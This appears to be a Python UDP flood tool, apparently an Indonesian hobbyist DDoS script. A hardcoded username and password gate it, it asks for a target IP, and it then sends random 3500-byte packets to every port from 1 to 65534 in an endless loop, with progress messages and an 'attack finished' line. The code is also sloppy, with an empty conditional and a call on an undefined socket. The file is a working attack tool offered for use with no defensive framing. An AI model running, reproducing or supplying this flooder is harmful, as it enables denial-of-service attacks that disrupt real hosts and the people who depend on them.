# -*- coding: utf-8 -*-
import os
import sys
import time
import socket
import random

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    os.system("clear")

########################
white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)
####################
attemps = 0
os.system("clear")
print("""
\033[0;31m╔════════════════════════════════════════════════════════════╗
\033[97m║\033[100m      ╔╗\033[100m                \033[97m║
\033[97m║\033[100m      █║\033[100m                \033[97m║
\033[97m║\033[100m      █║████ ████  █     █\033[100m       \033[97m║
\033[97m║\033[100m      █║     █      █  █     █\033[100m       \033[97m║
\033[97m║\033[100m      █║   █      █    █     █\033[100m       \033[97m║
\033[97m║\033[100m      █║ █      █       ████ \033[100m       \033[97m║
\033[97m║\033[100m      █╝████ ████        █ \033[100m       \033[97m║
\033[97m║\033[100m                            ███\033[100m       \033[97m║
\033[97m╚═══════════════════════════════
""")
while attemps < 100:
    username = input("\033[32mEnter your username: \033[0m")
    password = input("\033[31mEnter your password: \033[0m")

    if username == 'kun' and password == 'kaffa':
        print("\033[32m⟩⟩ Hidup cuma sekali malah jadi TERMUL...!! \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

ip = input("[+] Target's IP : ")
time.sleep(5),

while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        time.sleep(1)
        print("\033[100m \033[7m[IMF0] \033[0m \033[97m%s  \033[31mSent \033[92m%s \033[36m" % (sent, ip))
        print("\033[97m  [IMF0] \033[0m \033[36m%s  \033[32mSent \033[92m%s \033[94mPort \033[33m%s " % (sent, ip, port))
    
    if():
        s.close
        print("\033[92mSerangan wes Rampung\033[0m")
